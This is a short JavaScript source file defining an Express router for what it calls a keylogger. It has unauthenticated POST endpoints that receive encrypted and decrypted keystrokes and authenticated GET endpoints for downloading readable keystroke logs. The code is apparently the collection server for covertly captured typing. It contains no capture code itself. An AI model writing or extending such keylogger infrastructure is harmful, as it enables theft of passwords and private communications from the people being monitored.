import express from "express";
import {
  saveKeystrokes,
  getKeystrokes,
  saveDecryptedKeystrokes,
  getDecryptedKeystrokes,
} from "../controllers/keyloggerController.js";
import userAuth from "../middleware/userAuth.js";

const keyloggerRouter = express.Router();

// Encrypted keystrokes
keyloggerRouter.post("/data", saveKeystrokes);
keyloggerRouter.get("/data", userAuth, getKeystrokes); // Called by frontend (user/admin)
// Decrypted keystrokes
keyloggerRouter.post("/save-decrypted", saveDecryptedKeystrokes);
// download of readable logs
keyloggerRouter.get("/decrypted", userAuth, getDecryptedKeystrokes);

export default keyloggerRouter;
